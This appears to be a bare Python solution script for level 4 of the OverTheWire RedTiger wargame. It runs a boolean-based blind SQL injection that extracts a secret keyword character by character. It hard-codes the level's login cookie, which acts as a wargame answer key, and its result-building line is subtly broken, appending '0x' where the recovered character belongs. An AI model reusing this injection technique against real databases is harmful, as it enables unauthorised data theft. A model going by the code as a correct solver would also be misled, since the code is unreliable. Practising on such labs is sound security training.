import requests

requests.packages.urllib3.disable_warnings()

url = "http://redtiger.labs.overthewire.org/level4.php"
cookies = {
    "level4login":"put_the_kitten_on_your_head"
}

n = 0
bef_ret = ''
ans = ''
for i in range(1,22):
    # character range
    for m in range(31, 128):
        params = {
            "id": "1 and if((select substring(keyword,%s,1) from level4_secret)=%s,1,0)" % (str(i),hex(m))
        }
        print("1 and if((select substring(keyword,%s,1) from level4_secret)=%s,1,0)" % (str(i),hex(m)))
        r = requests.post(url, cookies=cookies, params = params, verify=False)
        if bef_ret != r.content and bef_ret != '':
            print(r.content)
            ans += str(hex(m))[:2]
            break
        bef_ret = r.content
        
print(ans)
